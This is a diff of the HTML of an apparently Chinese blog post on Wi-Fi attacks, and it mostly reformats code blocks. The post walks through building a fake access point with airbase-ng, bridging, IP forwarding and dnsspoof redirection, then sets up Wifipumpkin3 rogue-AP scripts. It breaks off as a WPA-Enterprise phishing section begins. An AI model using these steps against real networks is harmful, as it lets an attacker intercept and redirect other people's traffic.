@@ -30,7 +30,7 @@
 <meta property="og:description" content="该文章暂无概述">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2022-06-03T03:39:00.000Z">
-<meta property="article:modified_time" content="2023-12-12T15:38:59.236Z">
+<meta property="article:modified_time" content="2023-12-16T16:27:18.994Z">
 <meta property="article:author" content="Ghost">
 <meta property="article:tag" content="wifi 渗透">
 <meta name="twitter:card" content="summary">
@@ -243,7 +243,7 @@
         <i class="far fa-calendar-check"></i>
       </span>
       <span class="post-meta-item-text">更新于</span>
-      <time title="修改时间：2023-12-12 23:38:59" itemprop="dateModified" datetime="2023-12-12T23:38:59+08:00">2023-12-12</time>
+      <time title="修改时间：2023-12-17 00:27:18" itemprop="dateModified" datetime="2023-12-17T00:27:18+08:00">2023-12-17</time>
     </span>
     <span class="post-meta-item">
       <span class="post-meta-item-icon">
@@ -266,7 +266,7 @@
         <i class="far fa-file-word"></i>
       </span>
       <span class="post-meta-item-text">本文字数：</span>
-      <span>1.4k</span>
+      <span>1.5k</span>
     </span>
     <span class="post-meta-item" title="阅读时长">
       <span class="post-meta-item-icon">
@@ -288,65 +288,40 @@
 <p><strong>环境</strong></p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220603182730988-1925046327.png" /></p>
 <h3 id="伪造假的ap">1、伪造假的AP</h3>
-<pre><code>airbase-ng  --essid zmr -c 11 wlan0mon</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">airbase-ng  --essid zmr -c 11 wlan0mon</span><br></pre></td></tr></table></figure>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220603155632491-118535334.png" /></p>
 <h3 id="安装网桥">2、安装网桥</h3>
-<pre><code>apt-get install bridge-utils</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install bridge-utils</span><br></pre></td></tr></table></figure>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220603152542618-189408732.png" /></p>
 <h3 id="添加网桥">3、添加网桥</h3>
-<pre><code>brctl addbr bridge-1</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brctl addbr bridge-1</span><br></pre></td></tr></table></figure>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220603155725434-800778591.png" /></p>
 <p><strong>将 at0 和 eth0
 网卡添加到网桥，此时这两个网卡工作于混杂模式，所以不需要IP了，因为网桥是工作在链路层的。</strong></p>
-<pre><code>**┌──(root💀kali)-[~ ]
-└─# ifconfig eth0 0.0.0.0 up
-    
-┌──(root💀kali)-[~]
-└─# ifconfig at0 0.0.0.0 up                                                                                                        
-                                                                                                                                         
-┌──(root💀kali)-[~]
-└─# brctl addif bridge-1 eth0 at0**</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~ ]</span><br><span class="line">└─<span class="comment"># ifconfig eth0 0.0.0.0 up</span></span><br><span class="line"></span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># ifconfig at0 0.0.0.0 up</span></span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># brctl addif bridge-1 eth0 at0</span></span><br></pre></td></tr></table></figure>
 <h3 id="为网桥配置-ip-地址">4、为网桥配置 IP 地址</h3>
-<pre><code>┌──(root💀kali)-[~]
-└─# ifconfig bridge-1 10.10.10.190  netmask 255.255.255.0  up </code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># ifconfig bridge-1 10.10.10.190  netmask 255.255.255.0  up </span></span><br></pre></td></tr></table></figure>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220603160533019-822417080.png" /></p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220603160746807-1068594635.png" /></p>
 <h3 id="添加网关">5、添加网关</h3>
 <p><strong>【主要为给连接假AP的station分配IP地址（DHCP），另外不添加也上不了网】</strong></p>
-<pre><code>┌──(root💀kali)-[~]
-└─# route add  -net 0.0.0.0 netmask 0.0.0.0  gw 10.10.10.2                                                                           
-                                                                                                                                         
-┌──(root💀kali)-[~]
-└─# netstat -nr
-Kernel IP routing table
-Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
-0.0.0.0         10.10.10.2      0.0.0.0         UG        0 0          0 bridge-1
-10.10.10.0      0.0.0.0         255.255.255.0   U         0 0          0 bridge-1</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># route add  -net 0.0.0.0 netmask 0.0.0.0  gw 10.10.10.2</span></span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># netstat -nr</span></span><br><span class="line">    Kernel IP routing table</span><br><span class="line">    Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface</span><br><span class="line">    0.0.0.0         10.10.10.2      0.0.0.0         UG        0 0          0 bridge-1</span><br><span class="line">    10.10.10.0      0.0.0.0         255.255.255.0   U         0 0          0 bridge-1</span><br></pre></td></tr></table></figure>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220603162616826-2127253691.png" /></p>
 <p><strong>注，也可以直接在假AP上安装DHCP来给station分配IP</strong></p>
 <h3 id="开启路由转发">6、开启路由转发</h3>
-<pre><code>┌──(root💀kali)-[~]
-└─# cat /proc/sys/net/ipv4/ip_forward
-0
-                                                                                                                                         
-┌──(root💀kali)-[~]
-└─# echo 1 &gt; /proc/sys/net/ipv4/ip_forward
-                                                                                                                                         
-┌──(root💀kali)-[~]
-└─# cat /proc/sys/net/ipv4/ip_forward     
-1</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># cat /proc/sys/net/ipv4/ip_forward</span></span><br><span class="line">0</span><br><span class="line"> </span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># echo 1 &gt; /proc/sys/net/ipv4/ip_forward</span></span><br><span class="line"> </span><br><span class="line">┌──(root💀kali)-[~]</span><br><span class="line">└─<span class="comment"># cat /proc/sys/net/ipv4/ip_forward </span></span><br><span class="line">1</span><br></pre></td></tr></table></figure>
 <h3 id="dns欺骗">7、DNS欺骗</h3>
 <p><strong>安装dsniff【后面要用到dnsspoof】</strong></p>
-<pre><code>apt-get install dsniff</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install dsniff</span><br></pre></td></tr></table></figure>
 <p><strong><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220603191618455-2091993451.png" /></strong></p>
 <p><strong>指定DNS欺骗的接口</strong>
 【经过bridge-1的访问，都会依据hosts的设定发生重定向】</p>
-<pre><code>dnsspoof -i bridge-1 -f hosts</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dnsspoof -i bridge-1 -f hosts</span><br></pre></td></tr></table></figure>
 <p>hosts文件格式可参见：/usr/share/dsniff/dnsspoof.hosts</p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220603172751411-299511414.png" /></p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220603182957046-468786939.png" /></p>
 <h3 id="开启apache2服务">8、开启apache2服务</h3>
-<pre><code>service apache2 start</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">service apache2 start</span><br></pre></td></tr></table></figure>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220603163943908-351466792.png" /></p>
 <p><strong>此时连接zmr的设备访问baidu.com，163.com都会被重定向到上图页面</strong></p>
 <p><strong>注，个人实验未成功，试了好多次都是无法提供互联网连接（连接zmr-1的设备），但AP可以正常访问
@@ -356,11 +331,7 @@ Destination     Gateway         Genmask         Flags   MSS Window  irtt Iface
 <p>3vilTwinAttacker已经升级为Wifipumpkin3了，
 <strong>建议直接安装Wifipumpkin3练习</strong></p>
 <h3 id="viltwinattacker-安装">1、3vilTwinAttacker 安装</h3>
-<pre><code>git clone  https://github.com/wi-fi-analyzer/3vilTwinAttacker
-cd 3vilTwinAttacker
-sudo chmod +x installer.sh
-sudo ./installer.sh --install
-sudo ./installer.sh --uninstall       #卸载</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span>  https://github.com/wi-fi-analyzer/3vilTwinAttacker</span><br><span class="line"><span class="built_in">cd</span> 3vilTwinAttacker</span><br><span class="line">sudo <span class="built_in">chmod</span> +x installer.sh</span><br><span class="line">sudo ./installer.sh --install</span><br><span class="line">sudo ./installer.sh --uninstall   <span class="comment">#卸载</span></span><br></pre></td></tr></table></figure>
 <p><strong>结果</strong></p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220607105939369-172600856.jpg" /></p>
 <h3 id="可能会出现的报错">2、可能会出现的报错</h3>
@@ -381,9 +352,10 @@ sudo ./installer.sh --uninstall       #卸载</code></pre>
 真心不建议安装3vilTwinAttacker，会遇到各种奇奇怪怪的问题（环境版本导致），心态会崩…………</p>
 <h3 id="wifipumpkin3-安装">3、Wifipumpkin3 安装</h3>
 <p><strong>方法一（推荐）</strong></p>
-<pre><code>apt-get install wifipumpkin3</code></pre>
-<p><strong>方法二，自己下载包编译安装（也可能会遇到版本不匹配等问题，为此不建议用该方法），具体参见：&lt;https://wifipumpkin3.github.io/docs/getting-
-started#installation&gt;</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install wifipumpkin3</span><br></pre></td></tr></table></figure>
+<p><strong>方法二，自己下载包编译安装（也可能会遇到版本不匹配等问题，为此不建议用该方法），具体参见：<a
+target="_blank" rel="noopener" href="https://wifipumpkin3.github.io/docs/getting-started#installation"
+class="uri">https://wifipumpkin3.github.io/docs/getting-started#installation</a></strong></p>
 <p><strong>结果</strong></p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220607112534447-334909328.png" /></p>
 <h3 id="wifipumpkin3-使用"><strong>4、Wifipumpkin3 使用</strong></h3>
@@ -391,26 +363,17 @@ started#installation&gt;</strong></p>
 target="_blank" rel="noopener" href="https://wifipumpkin3.github.io/docs/getting-started#usage"
 class="uri">https://wifipumpkin3.github.io/docs/getting-started#usage</a></p>
 <p><strong>基本用法</strong></p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># wifipumpkin3 -h                 </span></span><br><span class="line">usage: wifipumpkin3 [-h] [-i INTERFACE] [-s SESSION] [-p PULP] [-x XPULP] [-m WIRELESS_MODE] [--no-colors] [--rest]</span><br><span class="line">                    [--restport RESTPORT] [--username USERNAME] [--password PASSWORD] [-v]</span><br><span class="line"></span><br><span class="line">wifipumpkin3 - Powerful framework <span class="keyword">for</span> rogue access point attack. See: https://wifipumpkin3.github.io/docs/getting-</span><br><span class="line">started<span class="comment">#usage</span></span><br><span class="line"></span><br><span class="line">options:</span><br><span class="line">  -h, --<span class="built_in">help</span>            show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">  -i INTERFACE          <span class="built_in">set</span> interface <span class="keyword">for</span> create AP</span><br><span class="line">  -s SESSION            <span class="built_in">set</span> session <span class="keyword">for</span> <span class="built_in">continue</span> attack</span><br><span class="line">  -p PULP, --pulp PULP  interactive sessions can be scripted with .pulp file</span><br><span class="line">  -x XPULP, --xpulp XPULP</span><br><span class="line">                        interactive sessions can be string with <span class="string">&quot;;&quot;</span> as the separator</span><br><span class="line">  -m WIRELESS_MODE, --wireless-mode WIRELESS_MODE</span><br><span class="line">                        <span class="built_in">set</span> wireless mode settings</span><br><span class="line">  --no-colors           <span class="built_in">disable</span> terminal colors and effects.</span><br><span class="line">  --rest                Run the Wp3 RESTful API.</span><br><span class="line">  --restport RESTPORT   Port to run the Wp3 RESTful API on. default is 1337</span><br><span class="line">  --username USERNAME   Start the RESTful API with the specified username instead of pulling from wp3.db</span><br><span class="line">  --password PASSWORD   Start the RESTful API with the specified password instead of pulling from wp3.db</span><br><span class="line">  -v, --version         show program<span class="string">&#x27;s version number and exit</span></span><br><span class="line"><span class="string">                                                                                                                               </span></span><br><span class="line"><span class="string">┌──(root㉿kali)-[~/Desktop]</span></span><br><span class="line"><span class="string">└─# wifipumpkin3    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  _      ___ _____     ___                  __    _      ____</span></span><br><span class="line"><span class="string"> | | /| / (_) __(_)___/ _ \__ ____ _  ___  / /__ (_)__  |_  /</span></span><br><span class="line"><span class="string"> | |/ |/ / / _// /___/ ___/ // /  &#x27;</span> \/ _ \/  <span class="string">&#x27;_// / _ \_/_ &lt; </span></span><br><span class="line"><span class="string"> |__/|__/_/_/ /_/   /_/   \_,_/_/_/_/ .__/_/\_\/_/_//_/____/ </span></span><br><span class="line"><span class="string">                                   /_/                       </span></span><br><span class="line"><span class="string">                                            codename: Yorixiriamori</span></span><br><span class="line"><span class="string">by: @mh4x0f - P0cL4bs Team | version: 1.1.2 dev</span></span><br><span class="line"><span class="string">[*] Session id: e35f7c50-e616-11ec-9da9-000c29fd148e </span></span><br><span class="line"><span class="string">Starting prompt...</span></span><br><span class="line"><span class="string">wp3 &gt; help</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Available Commands:</span></span><br><span class="line"><span class="string">=======================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Core Commands:</span></span><br><span class="line"><span class="string">==============</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Command      Description</span></span><br><span class="line"><span class="string">    -------      -----------</span></span><br><span class="line"><span class="string">    banner       display an awesome wp3 banner </span></span><br><span class="line"><span class="string">    exit         exit program and all threads</span></span><br><span class="line"><span class="string">    help         show this help </span></span><br><span class="line"><span class="string">    ignore       the message logger will be ignored </span></span><br><span class="line"><span class="string">    info         get information about proxy/plugin settings</span></span><br><span class="line"><span class="string">    kill         terminate a module in background by id</span></span><br><span class="line"><span class="string">    restore      the message logger will be restored </span></span><br><span class="line"><span class="string">    search       search modules by name</span></span><br><span class="line"><span class="string">    set          set variable proxy,plugin and access point </span></span><br><span class="line"><span class="string">    show         show available modules</span></span><br><span class="line"><span class="string">    unset        unset variable commnd hostapd_config</span></span><br><span class="line"><span class="string">    use          select module for modules</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Ap Commands:</span></span><br><span class="line"><span class="string">============</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Command      Description</span></span><br><span class="line"><span class="string">    -------      -----------</span></span><br><span class="line"><span class="string">    ap           show all variable and status from AP </span></span><br><span class="line"><span class="string">    clients      show all connected clients on AP </span></span><br><span class="line"><span class="string">    dhcpconf     show/choise dhcp server configuration </span></span><br><span class="line"><span class="string">    dhcpmode     show/set all available dhcp server </span></span><br><span class="line"><span class="string">    dump         dump informations from client connected on AP </span></span><br><span class="line"><span class="string">    jobs         show all threads/processes in background </span></span><br><span class="line"><span class="string">    mode         all wireless mode available </span></span><br><span class="line"><span class="string">    start        start access point service</span></span><br><span class="line"><span class="string">    stop         stop access point service</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Network Commands:</span></span><br><span class="line"><span class="string">=================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Command      Description</span></span><br><span class="line"><span class="string">    -------      -----------</span></span><br><span class="line"><span class="string">    plugins      show all available plugins </span></span><br><span class="line"><span class="string">    proxies      show all available proxies</span></span><br><span class="line"><span class="string"></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line">┌──(root㉿kali)-[~/Desktop]</span><br><span class="line">└─<span class="comment"># wifipumpkin3 -h                 </span></span><br><span class="line">usage: wifipumpkin3 [-h] [-i INTERFACE] [-s SESSION] [-p PULP] [-x XPULP] [-m WIRELESS_MODE] [--no-colors] [--rest]</span><br><span class="line">                    [--restport RESTPORT] [--username USERNAME] [--password PASSWORD] [-v]</span><br><span class="line"></span><br><span class="line">wifipumpkin3 - Powerful framework <span class="keyword">for</span> rogue access point attack. See: https://wifipumpkin3.github.io/docs/getting-</span><br><span class="line">started<span class="comment">#usage</span></span><br><span class="line"></span><br><span class="line">options:</span><br><span class="line">  -h, --<span class="built_in">help</span>            show this <span class="built_in">help</span> message and <span class="built_in">exit</span></span><br><span class="line">  -i INTERFACE          <span class="built_in">set</span> interface <span class="keyword">for</span> create AP</span><br><span class="line">  -s SESSION            <span class="built_in">set</span> session <span class="keyword">for</span> <span class="built_in">continue</span> attack</span><br><span class="line">  -p PULP, --pulp PULP  interactive sessions can be scripted with .pulp file</span><br><span class="line">  -x XPULP, --xpulp XPULP</span><br><span class="line">                        interactive sessions can be string with <span class="string">&quot;;&quot;</span> as the separator</span><br><span class="line">  -m WIRELESS_MODE, --wireless-mode WIRELESS_MODE</span><br><span class="line">                        <span class="built_in">set</span> wireless mode settings</span><br><span class="line">  --no-colors           <span class="built_in">disable</span> terminal colors and effects.</span><br><span class="line">  --rest                Run the Wp3 RESTful API.</span><br><span class="line">  --restport RESTPORT   Port to run the Wp3 RESTful API on. default is 1337</span><br><span class="line">  --username USERNAME   Start the RESTful API with the specified username instead of pulling from wp3.db</span><br><span class="line">  --password PASSWORD   Start the RESTful API with the specified password instead of pulling from wp3.db</span><br><span class="line">  -v, --version         show program<span class="string">&#x27;s version number and exit</span></span><br><span class="line"><span class="string">                                                                                                                               </span></span><br><span class="line"><span class="string">┌──(root㉿kali)-[~/Desktop]</span></span><br><span class="line"><span class="string">└─# wifipumpkin3    </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  _      ___ _____     ___                  __    _      ____</span></span><br><span class="line"><span class="string"> | | /| / (_) __(_)___/ _ \__ ____ _  ___  / /__ (_)__  |_  /</span></span><br><span class="line"><span class="string"> | |/ |/ / / _// /___/ ___/ // /  &#x27;</span> \/ _ \/  <span class="string">&#x27;_// / _ \_/_ &lt; </span></span><br><span class="line"><span class="string"> |__/|__/_/_/ /_/   /_/   \_,_/_/_/_/ .__/_/\_\/_/_//_/____/ </span></span><br><span class="line"><span class="string">                                   /_/                       </span></span><br><span class="line"><span class="string">                                            codename: Yorixiriamori</span></span><br><span class="line"><span class="string">by: @mh4x0f - P0cL4bs Team | version: 1.1.2 dev</span></span><br><span class="line"><span class="string">[*] Session id: e35f7c50-e616-11ec-9da9-000c29fd148e </span></span><br><span class="line"><span class="string">Starting prompt...</span></span><br><span class="line"><span class="string">wp3 &gt; help</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">[*] Available Commands:</span></span><br><span class="line"><span class="string">=======================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Core Commands:</span></span><br><span class="line"><span class="string">==============</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Command      Description</span></span><br><span class="line"><span class="string">    -------      -----------</span></span><br><span class="line"><span class="string">    banner       display an awesome wp3 banner </span></span><br><span class="line"><span class="string">    exit         exit program and all threads</span></span><br><span class="line"><span class="string">    help         show this help </span></span><br><span class="line"><span class="string">    ignore       the message logger will be ignored </span></span><br><span class="line"><span class="string">    info         get information about proxy/plugin settings</span></span><br><span class="line"><span class="string">    kill         terminate a module in background by id</span></span><br><span class="line"><span class="string">    restore      the message logger will be restored </span></span><br><span class="line"><span class="string">    search       search modules by name</span></span><br><span class="line"><span class="string">    set          set variable proxy,plugin and access point </span></span><br><span class="line"><span class="string">    show         show available modules</span></span><br><span class="line"><span class="string">    unset        unset variable commnd hostapd_config</span></span><br><span class="line"><span class="string">    use          select module for modules</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Ap Commands:</span></span><br><span class="line"><span class="string">============</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Command      Description</span></span><br><span class="line"><span class="string">    -------      -----------</span></span><br><span class="line"><span class="string">    ap           show all variable and status from AP </span></span><br><span class="line"><span class="string">    clients      show all connected clients on AP </span></span><br><span class="line"><span class="string">    dhcpconf     show/choise dhcp server configuration </span></span><br><span class="line"><span class="string">    dhcpmode     show/set all available dhcp server </span></span><br><span class="line"><span class="string">    dump         dump informations from client connected on AP </span></span><br><span class="line"><span class="string">    jobs         show all threads/processes in background </span></span><br><span class="line"><span class="string">    mode         all wireless mode available </span></span><br><span class="line"><span class="string">    start        start access point service</span></span><br><span class="line"><span class="string">    stop         stop access point service</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Network Commands:</span></span><br><span class="line"><span class="string">=================</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Command      Description</span></span><br><span class="line"><span class="string">    -------      -----------</span></span><br><span class="line"><span class="string">    plugins      show all available plugins </span></span><br><span class="line"><span class="string">    proxies      show all available proxies</span></span><br></pre></td></tr></table></figure>
 <p>可以用自己编的脚本（指定网卡，ssid等）启动，也可以启动时加上--
 xpulp以字符串的形式指定网卡，ssid等，当然也可以在启动后再用set命令设定相关信息，如</p>
 <p><strong>wlan0_start.pulp</strong></p>
-<pre><code># configure the interface
-set interface wlan0 
-# set name of access point will be created
-set ssid z9m8r8
-# set noproxy plguin
-set proxy noproxy
-# ignore all log from pydns_server 
-ignore pydns_server
-# start the Access Point
-start</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># configure the interface</span></span><br><span class="line"><span class="built_in">set</span> interface wlan0 </span><br><span class="line"><span class="comment"># set name of access point will be created</span></span><br><span class="line"><span class="built_in">set</span> ssid z9m8r8</span><br><span class="line"><span class="comment"># set noproxy plguin</span></span><br><span class="line"><span class="built_in">set</span> proxy noproxy</span><br><span class="line"><span class="comment"># ignore all log from pydns_server </span></span><br><span class="line">ignore pydns_server</span><br><span class="line"><span class="comment"># start the Access Point</span></span><br><span class="line">start</span><br></pre></td></tr></table></figure>
 <p><strong>伪造AP</strong></p>
-<pre><code>sudo wifipumpkin3 --pulp wlan0_start.pulp</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wifipumpkin3 --pulp wlan0_start.pulp</span><br></pre></td></tr></table></figure>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220607114054003-1567069836.png" /></p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220607115217974-1010717217.png" /></p>
 <p><strong>或</strong></p>
-<pre><code> sudo wifipumpkin3 --xpulp &quot;set interface wlan0; set ssid z9m8r8; set proxy noproxy; start&quot;</code></pre>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo wifipumpkin3 --xpulp <span class="string">&quot;set interface wlan0; set ssid z9m8r8; set proxy noproxy; start&quot;</span></span><br></pre></td></tr></table></figure>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220607120120362-1047558196.png" /></p>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220607115916408-2135303724.png" /></p>
 <p><strong>有 station 连接AP时，会出现下面的情况，当 station
@@ -418,46 +381,38 @@ start</code></pre>
 <p><img data-src="https://fastly.jsdelivr.net/gh/z9m8r8/PicGo-Notes-Pu/cnblogs/2379545-20220607120254179-1320812579.png" /></p>
 <h2 id="wpa-企业钓鱼攻击">3. WPA 企业钓鱼攻击</h2>
 <h3 id="安装">1、安装</h3>
-<pre><code>┌──(root㉿kali)-[~]
-└─# apt-get install hostapd
-
